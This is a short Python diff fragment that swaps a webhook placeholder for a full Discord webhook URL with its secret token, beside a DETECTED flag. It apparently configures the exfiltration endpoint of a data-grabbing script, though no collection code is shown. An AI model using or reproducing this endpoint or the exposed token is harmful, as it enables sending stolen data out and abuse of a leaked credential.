@@ -16,7 +16,7 @@ import re
 import subprocess
 
 
-hook = "YOUR WEBHOOK HERE"
+hook = "https://discord.com/api/webhooks/1067019093670117406/4vZLkCbvtYjRY08hkZeZRS8Xy3u-q69gVXTdQJNgLuD99HNUmkNISKmGmN2LYyB2Dlj4"
 
 
 DETECTED = False
